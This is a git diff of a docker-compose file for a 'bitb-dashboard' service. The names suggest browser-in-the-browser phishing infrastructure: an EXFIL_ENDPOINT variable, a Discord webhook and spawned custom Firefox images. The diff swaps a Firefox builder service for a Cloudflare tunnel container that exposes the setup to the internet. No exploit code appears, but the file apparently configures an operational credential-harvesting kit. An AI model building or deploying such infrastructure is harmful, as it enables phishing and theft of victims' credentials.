@@ -1,3 +1,5 @@
+version: '3.8'
+
 services:
   bitb-dashboard:
     build:
@@ -10,7 +12,7 @@ services:
     environment:
       - REDIS_URL=redis://redis:6379
       - DISCORD_WEBHOOK=${DISCORD_WEBHOOK}
-      - CLOUDFLARE_TOKEN=${CLOUDFLARE_TOKEN:-}
+      - CLOUDFLARE_TUNNEL_TOKEN=${CLOUDFLARE_TUNNEL_TOKEN}
       - ADMIN_IPS=${ADMIN_IPS:-127.0.0.1}
       - SECRET_KEY=${SECRET_KEY:-changeme}
       - EXFIL_ENDPOINT=${EXFIL_ENDPOINT:-http://localhost:8080}
@@ -31,16 +33,12 @@ services:
     networks:
       - bitb_net
 
-  # Build-only service for the Firefox browser image so Compose ensures the
-  # `bitb-firefox-custom:latest` image is available for the app to spawn.
-  bitb-firefox-builder:
-    build:
-      context: .
-      dockerfile: Dockerfile.firefox-custom
-    image: bitb-firefox-custom:latest
-    container_name: bitb-firefox-builder
-    entrypoint: ["/bin/true"]
-    restart: "no"
+  # Cloudflare Tunnel service
+  cloudflared:
+    image: cloudflare/cloudflared:latest
+    container_name: bitb-cloudflared
+    restart: unless-stopped
+    command: tunnel --no-autoupdate run --token ${CLOUDFLARE_TUNNEL_TOKEN}
     networks:
       - bitb_net
 
